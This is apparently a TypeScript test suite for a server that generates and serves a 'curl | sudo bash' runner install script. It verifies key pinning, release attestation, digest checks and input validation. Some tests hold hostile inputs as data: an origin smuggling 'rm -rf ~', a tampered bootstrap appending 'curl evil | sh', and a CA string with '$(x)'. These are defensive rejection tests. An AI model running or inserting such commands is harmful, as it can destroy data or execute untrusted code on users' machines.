import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import Fastify from "fastify";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { issueAuthority, publicKeyPin } from "../src/agents/remote/x509.js";
import { RunnerRequestError } from "../src/agents/remote/service.js";
import {
  registerRunnerInstaller,
  runnerInstallCommand,
  runnerInstallScript,
} from "../src/routes/runner-installer.js";

const revision = "2c8f997d5349";
const version = "1.7.28";
const sha = (data: Buffer | string) =>
  createHash("sha256").update(data).digest("hex");
const { cert: caPem } = issueAuthority("Dispatch runner CA test");
const pin = publicKeyPin(caPem);
const listenerOrigin = "https://192.168.1.246:62699";
const webOrigin = "http://192.168.1.246:51838";
const pinned = runnerInstallCommand({ origin: listenerOrigin, pin });
const base = `${listenerOrigin}/api/v1/runner-artifacts/${revision}`;
/** The served installer records its arguments and exits as told. */
const bootstrap =
  '#!/bin/bash\nprintf \'installer %s\\n\' "$*" >> "$LOG"\nexit "${INSTALL_EXIT:-0}"\n';
const archive = "archive bytes";
const dev = {
  bootstrapSha256: sha(bootstrap),
  archiveSha256: { x64: sha(archive), arm64: sha("arm archive") },
};
const release = {
  origin: listenerOrigin,
  revision,
  version,
  caPem,
  command: pinned,
};

let temp: string;

beforeEach(async () => {
  temp = await mkdtemp(path.join(os.tmpdir(), "runner-install-script-"));
  const bin = path.join(temp, "bin");
  const served = path.join(temp, "served");
  await mkdir(bin);
  await mkdir(served);
  await writeFile(path.join(served, "install-dispatch-runner.sh"), bootstrap);
  await writeFile(
    path.join(served, "install-dispatch-runner.sh.sigstore.json"),
    "{}"
  );
  // Stand-ins that record their arguments. curl serves by file name and
  // keeps a copy of the CA it was told to trust.
  const stubs: Record<string, string> = {
    curl: `#!/bin/sh
printf 'curl %s\\n' "$*" >> "$LOG"
prev=
for arg; do
  [ "$prev" = --cacert ] && cp "$arg" "$SERVED/../trusted-ca.pem"
  prev=$arg
done
eval "url=\\\${$(($# - 2))}"
name=\${url##*/}
case "$name" in
  install-dispatch-runner-linux-*.sh*) name=install-dispatch-runner.sh\${name#*.sh} ;;
esac
if [ -n "\${STUB_HTTP:-}" ]; then printf %s "$STUB_HTTP"; exit 22; fi
cp "$SERVED/$name" "$arg"`,
    gh: `#!/bin/sh\nprintf 'gh %s\\n' "$*" >> "$LOG"\n[ ! -e "$SERVED/reject" ]`,
    uname: `#!/bin/sh\ncase "$1" in -s) echo "\${STUB_OS:-Linux}" ;; -m) echo "\${STUB_ARCH:-x86_64}" ;; esac`,
    id: `#!/bin/sh\necho "\${STUB_UID:-0}"`,
    getent: `#!/bin/sh\nprintf 'build:x:1000:1001::%s:/bin/sh\\n' "$SERVED/../home"`,
    setpriv: `#!/bin/sh
[ "$1 $2 $3" = '--reuid=1000 --regid=1001 --init-groups' ] || exit 1
[ "$4 $5" = 'env -i' ] && [ "\${11}" = -lc ] || exit 1
printf 'login gh as %s\\n' "\${7#USER=}" >> "$LOG"
shift 13
[ -n "$(find "$(dirname "$3")" -maxdepth 0 -perm 0711 -print)" ] || exit 1
[ -n "$(find "$3" -perm 0644 -print)" ] || exit 1
[ -n "$(find "$7" -perm 0644 -print)" ] || exit 1
exec "$(dirname "$0")/gh" "$@"`,
  };
  for (const [name, body] of Object.entries(stubs)) {
    await writeFile(path.join(bin, name), body);
    await chmod(path.join(bin, name), 0o755);
  }
});

afterEach(async () => {
  vi.restoreAllMocks();
  await rm(temp, { recursive: true, force: true });
});

/** Pipe a script into a shell as `curl … | sudo bash -s -- ARGS` does. */
function pipe(
  script: string,
  args: string[] = [],
  options: { shell?: string; env?: Record<string, string> } = {}
) {
  return new Promise<{ code: number; stderr: string; log: string[] }>(
    (resolve) => {
      const child = spawn(options.shell ?? "bash", ["-s", "--", ...args], {
        env: {
          PATH: `${path.join(temp, "bin")}:/usr/bin:/bin:/sbin`,
          LOG: path.join(temp, "log"),
          SERVED: path.join(temp, "served"),
          TMPDIR: path.join(temp, "tmp"),
          ...options.env,
        },
      });
      let stderr = "";
      child.stderr.on("data", (chunk) => (stderr += chunk));
      child.on("close", async (code) => {
        const log = await readFile(path.join(temp, "log"), "utf8").catch(
          () => ""
        );
        await rm(path.join(temp, "log"), { force: true });
        resolve({
          code: code ?? 1,
          stderr,
          log: log.split("\n").filter(Boolean),
        });
      });
      child.stdin.end(script);
    }
  );
}

beforeEach(async () => {
  await mkdir(path.join(temp, "tmp"));
});

const leftovers = async () =>
  (await import("node:fs/promises")).readdir(path.join(temp, "tmp"));

describe("runner install command", () => {
  it("pins the runner listener's key, or uses the web origin without one", () => {
    expect(pinned).toBe(
      `curl -fsSk --pinnedpubkey 'sha256//${pin}' https://192.168.1.246:62699/install | sudo bash`
    );
    expect(runnerInstallCommand({ origin: webOrigin })).toBe(
      "curl -fsSL http://192.168.1.246:51838/api/v1/runner-artifacts/install | sudo bash"
    );
  });

  it.each([
    [{ origin: "https://host'; rm -rf ~; '", pin }, "quoted origin"],
    [{ origin: "https://host/path", pin }, "origin with a path"],
    [{ origin: "ftp://host" }, "other scheme"],
    [{ origin: "http://host:1", pin }, "pin over http"],
    [{ origin: listenerOrigin, pin: "abc'" }, "malformed pin"],
  ])("rejects %o (%s)", (input) => {
    expect(() => runnerInstallCommand(input)).toThrow();
  });
});

describe.each(["sh", "bash", "dash"])(
  "runner install script under %s",
  (shell) => {
    it("trusts only the embedded CA, verifies the release bootstrap, then installs with the operator's options", async () => {
      const { code, log } = await pipe(
        runnerInstallScript(release),
        ["--user", "build"],
        { shell }
      );
      expect(code).toBe(0);
      for (const line of log.slice(0, 2))
        expect(line).toMatch(
          /^curl -qfsSL --proto =https --proto-redir =https --cacert \S+\/ca\.pem -w %\{http_code\} https:\/\//
        );
      expect(await readFile(path.join(temp, "trusted-ca.pem"), "utf8")).toBe(
        caPem.trim() + "\n"
      );
      expect(log[2]).toMatch(
        /^gh attestation verify \S+install-dispatch-runner\.sh --hostname github\.com --bundle .* --repo selfcontained\/dispatch --signer-workflow selfcontained\/dispatch\/\.github\/workflows\/release\.yml$/
      );
      expect(log[3]).toMatch(
        new RegExp(
          `^installer install --tag v${version} --source ${base} --cacert \\S+/ca\\.pem --user build$`
        )
      );
      expect(await leftovers()).toEqual([]);
    });

    it("uses the invoking account's login shell for release verification", async () => {
      const { code, log } = await pipe(runnerInstallScript(release), [], {
        shell,
        env: { SUDO_USER: "build" },
      });
      expect(code).toBe(0);
      expect(log.slice(2)).toEqual([
        "login gh as build",
        expect.stringMatching(/^gh attestation verify /),
        expect.stringMatching(/^installer install /),
      ]);
    });

    it("does not run a bootstrap that fails provenance", async () => {
      await writeFile(path.join(temp, "served/reject"), "");
      const { code, log } = await pipe(runnerInstallScript(release), [], {
        shell,
      });
      expect(code).not.toBe(0);
      expect(log.some((line) => line.startsWith("installer"))).toBe(false);
      expect(await leftovers()).toEqual([]);
    });

    it("tells an old release apart from a payload the controller could not prepare", async () => {
      const release404 = await pipe(runnerInstallScript(release), [], {
        shell,
        env: { STUB_HTTP: "404" },
      });
      expect(release404.code).toBe(1);
      expect(release404.stderr).toContain(
        "must publish attested native runner payloads"
      );
      const failed = await pipe(runnerInstallScript(release), [], {
        shell,
        env: { STUB_HTTP: "503", STUB_ARCH: "aarch64" },
      });
      expect(failed.code).toBe(1);
      expect(failed.stderr).toContain(
        "could not fetch or verify the Linux arm64 runner payload"
      );
      expect(failed.stderr).toContain("Check the controller logs.");
      expect(failed.stderr).not.toContain("must publish");
      expect(failed.log.some((line) => line.startsWith("installer"))).toBe(
        false
      );
      expect(await leftovers()).toEqual([]);
    });

    it("exits with the installer's status, including 75 for a deferred update", async () => {
      for (const status of [0, 1, 75]) {
        const { code } = await pipe(runnerInstallScript(release), [], {
          shell,
          env: { INSTALL_EXIT: String(status) },
        });
        expect(code).toBe(status);
      }
      expect(await leftovers()).toEqual([]);
    });

    it("refuses to run without root before downloading anything", async () => {
      const { code, stderr, log } = await pipe(
        runnerInstallScript(release),
        [],
        {
          shell,
          env: { STUB_UID: "1000" },
        }
      );
      expect(code).toBe(1);
      expect(stderr).toContain(`Run this as root: ${pinned}`);
      expect(log).toEqual([]);
    });

    it("fetches plain HTTP from the web origin with the same release verification", async () => {
      const script = runnerInstallScript({
        origin: webOrigin,
        revision,
        version,
        command: runnerInstallCommand({ origin: webOrigin }),
      });
      expect(script).not.toContain("ca.pem");
      const { code, log } = await pipe(script, [], { shell });
      expect(code).toBe(0);
      expect(log[0]).toContain(
        "--proto =http --proto-redir =http -w %{http_code} http://"
      );
      expect(log[2]).toMatch(/^gh attestation verify /);
      expect(log[3]).toBe(
        `installer install --tag v1.7.28 --source ${webOrigin}/api/v1/runner-artifacts/${revision}`
      );
    });

    it("refuses a dev build until the operator accepts it, naming the exact command", async () => {
      const script = runnerInstallScript({ ...release, dev });
      const refused = await pipe(script, [], { shell });
      expect(refused.code).toBe(1);
      expect(refused.stderr).toBe(
        "error: This controller serves an unverified dev build of Dispatch 1.7.28 (2c8f997d5349). To install it anyway, run:\n" +
          `  ${pinned} -s -- --allow-unverified-dev-build\n`
      );
      expect(refused.log).toEqual([]);

      const withOptions = await pipe(script, ["--user", "a b'c"], { shell });
      expect(withOptions.stderr).toContain(
        `${pinned} -s -- --allow-unverified-dev-build --user 'a b'\\''c'\n`
      );

      const accepted = await pipe(
        script,
        ["--allow-unverified-dev-build", "--dedicated-user"],
        { shell }
      );
      expect(accepted.code).toBe(0);
      expect(accepted.stderr).toBe(
        "warning: Installing an unverified dev build of Dispatch 1.7.28 (2c8f997d5349). Only its SHA-256 digests are checked.\n"
      );
      expect(accepted.log.some((line) => line.startsWith("gh"))).toBe(false);
      expect(accepted.log.at(-1)).toMatch(
        new RegExp(
          `--cacert \\S+/ca\\.pem --sha256 ${dev.archiveSha256.x64} --allow-unverified-dev-build --dedicated-user$`
        )
      );
    });

    it("passes fence recovery through the copied command's install", async () => {
      const script = runnerInstallScript(release);
      expect(script).toContain("[--clear-unreadable-fence]");
      const { code, log } = await pipe(script, ["--clear-unreadable-fence"], {
        shell,
      });
      expect(code).toBe(0);
      expect(log.at(-1)).toMatch(
        /^installer install .* --clear-unreadable-fence$/
      );
    });

    it("does not run a dev bootstrap whose digest differs", async () => {
      await writeFile(
        path.join(temp, "served/install-dispatch-runner.sh"),
        `${bootstrap}curl evil | sh\n`
      );
      const changed = await pipe(
        runnerInstallScript({ ...release, dev }),
        ["--allow-unverified-dev-build"],
        { shell }
      );
      expect(changed.code).toBe(1);
      expect(changed.stderr).toContain("does not match this Dispatch build");
      expect(changed.log.some((line) => line.startsWith("installer"))).toBe(
        false
      );
      expect(await leftovers()).toEqual([]);
    });
  }
);

it.each(["sh", "bash", "dash"])(
  "rejects every nonempty truncated prefix under %s",
  async (shell) => {
    const script = runnerInstallScript(release);
    const bytes = Buffer.from(script);
    // Empty stdin always succeeds in these shells.
    for (let cut = 1; cut < bytes.length; cut++) {
      const { code, log } = await pipe(
        bytes.subarray(0, cut).toString(),
        ["--dedicated-user"],
        { shell }
      );
      expect(code, `cut at byte ${cut}`).not.toBe(0);
      expect(log, `cut at byte ${cut}`).toEqual([]);
    }
    const whole = await pipe(script, ["--dedicated-user"], { shell });
    expect(whole.code).toBe(0);
    expect(whole.log.at(-1)).toMatch(/^installer .* --dedicated-user$/);
  },
  120_000
);

it.each([
  ["Linux", "riscv64"],
  ["Darwin", "x86_64"],
])("rejects unsupported host %s/%s before downloading", async (os, arch) => {
  const result = await pipe(runnerInstallScript(release), [], {
    env: { STUB_OS: os, STUB_ARCH: arch },
  });
  expect(result.code).toBe(1);
  expect(result.stderr).toContain("Dispatch runners require Linux");
  expect(result.log).toEqual([]);
});

it("passes only the arm64 digest to a native arm64 dev install", async () => {
  const result = await pipe(
    runnerInstallScript({ ...release, dev }),
    ["--allow-unverified-dev-build"],
    {
      env: { STUB_ARCH: "aarch64" },
    }
  );
  expect(result.code).toBe(0);
  expect(result.log.at(-1)).toContain(`--sha256 ${dev.archiveSha256.arm64} `);
  expect(result.log.at(-1)).not.toContain(dev.archiveSha256.x64);
});

it("reports when the dev controller has no payload for the host", async () => {
  const result = await pipe(
    runnerInstallScript({
      ...release,
      dev: { ...dev, archiveSha256: { x64: dev.archiveSha256.x64 } },
    }),
    ["--allow-unverified-dev-build"],
    {
      env: { STUB_ARCH: "aarch64" },
    }
  );
  expect(result.code).toBe(1);
  expect(result.stderr).toContain("No dev runner payload");
  expect(result.log).toEqual([]);
});

describe("runner install script validation", () => {
  it.each([
    [{ revision: "main" }, "symbolic revision"],
    [{ version: "1.7.28-dev" }, "non-release version"],
    [{ caPem: "-----BEGIN CERTIFICATE-----\n'$(x)'\n" }, "bad CA"],
    [{ origin: webOrigin }, "CA over http"],
    [
      { dev: { bootstrapSha256: "x", archiveSha256: { x64: sha(archive) } } },
      "bad digest",
    ],
    [{ dev: { ...dev, archiveSha256: { arm64: "bad" } } }, "bad arm64 digest"],
  ])("rejects %o (%s)", (change) => {
    expect(() =>
      runnerInstallScript({ ...release, ...change } as typeof release)
    ).toThrow();
  });
});

describe("runner installer routes", () => {
  const files = [
    { name: "install-dispatch-runner.sh", sha256: dev.bootstrapSha256 },
    { name: "dispatch-runner-linux-x64.tar.gz", sha256: dev.archiveSha256.x64 },
    {
      name: "dispatch-runner-linux-arm64.tar.gz",
      sha256: dev.archiveSha256.arm64,
    },
  ];

  async function serve(
    options: {
      enabled?: boolean;
      kind?: "release" | "dev";
      endpoint?: () => Promise<{ origin: string; pin: string }>;
      listener?: { caPem: string; pin: string };
      revision?: string | null;
      preparationFailed?: boolean;
    },
    request: { url: string; headers?: Record<string, string> }
  ) {
    const app = Fastify();
    const get = vi.fn().mockResolvedValue({ source: options.kind, files });
    const artifactEndpoint = vi.fn(
      options.endpoint ?? (async () => ({ origin: listenerOrigin, pin }))
    );
    registerRunnerInstaller(app, {
      runners: {
        artifactEndpoint,
        listenerInstall: () =>
          "listener" in options ? options.listener : { caPem, pin },
      },
      artifacts: {
        enabled: options.enabled ?? true,
        kind: options.kind ?? "release",
        preparationFailed: () => options.preparationFailed ?? false,
        get,
      } as never,
      build: {
        revision: options.revision === undefined ? revision : options.revision,
        version,
      },
    });
    const response = await app.inject({
      url: request.url,
      headers: { host: "192.168.1.246:51838", ...request.headers },
    });
    await app.close();
    return { response, get, artifactEndpoint };
  }
  const installer = { url: "/api/v1/runners/installer" };
  const script = { url: "/api/v1/runner-artifacts/install" };
  const relayed = {
    ...script,
    headers: { "x-dispatch-runner-listener": listenerOrigin },
  };

  it("copies the pinned listener one-liner", async () => {
    for (const kind of ["release", "dev"] as const) {
      const { response, get } = await serve({ kind }, installer);
      expect(response.json()).toEqual({
        revision,
        version,
        source: kind,
        command: pinned,
      });
      expect(get).not.toHaveBeenCalled();
    }
  });

  it("copies the web origin one-liner when the runner listener is disabled", async () => {
    const { response } = await serve(
      {
        endpoint: () =>
          Promise.reject(
            new RunnerRequestError(409, "Runner enrollment is disabled.")
          ),
      },
      installer
    );
    expect(response.json().command).toBe(
      runnerInstallCommand({ origin: webOrigin })
    );
  });

  it("offers no command when this build serves no runner artifacts", async () => {
    for (const options of [{ enabled: false }, { revision: null }]) {
      const { response } = await serve(options, installer);
      expect(response.json().command).toBeNull();
    }
  });

  it("suppresses the command while artifact preparation failures are cached", async () => {
    const { response, get, artifactEndpoint } = await serve(
      { preparationFailed: true },
      installer
    );
    expect(response.json().command).toBeNull();
    expect(get).not.toHaveBeenCalled();
    expect(artifactEndpoint).not.toHaveBeenCalled();
  });

  it("serves the listener script with its CA, and the web script without", async () => {
    const viaListener = await serve({}, relayed);
    expect(viaListener.response.statusCode).toBe(200);
    expect(viaListener.response.headers["content-type"]).toMatch(
      /^text\/x-shellscript/
    );
    expect(viaListener.response.body).toBe(runnerInstallScript(release));
    // Serving a script never prepares or re-keys the listener.
    expect(viaListener.artifactEndpoint).not.toHaveBeenCalled();

    const viaWeb = await serve({}, script);
    expect(viaWeb.response.body).toBe(
      runnerInstallScript({
        origin: webOrigin,
        revision,
        version,
        command: runnerInstallCommand({ origin: webOrigin }),
      })
    );
  });

  it("embeds the dev build's digests in the served script", async () => {
    const { response } = await serve({ kind: "dev" }, relayed);
    expect(response.body).toBe(runnerInstallScript({ ...release, dev }));
  });

  it("serves a script that fails when no installer can be offered", async () => {
    for (const [options, request] of [
      [{ enabled: false }, script],
      [{ listener: undefined }, relayed],
    ] as const) {
      const { response } = await serve(options, request);
      const result = await pipe(response.body);
      expect(result.code).toBe(1);
      expect(result.stderr).toMatch(/^error: /);
    }
    const bad = await serve(
      {},
      { ...script, headers: { "x-dispatch-runner-listener": "https://a'b" } }
    );
    expect(bad.response.statusCode).toBe(400);
  });
});
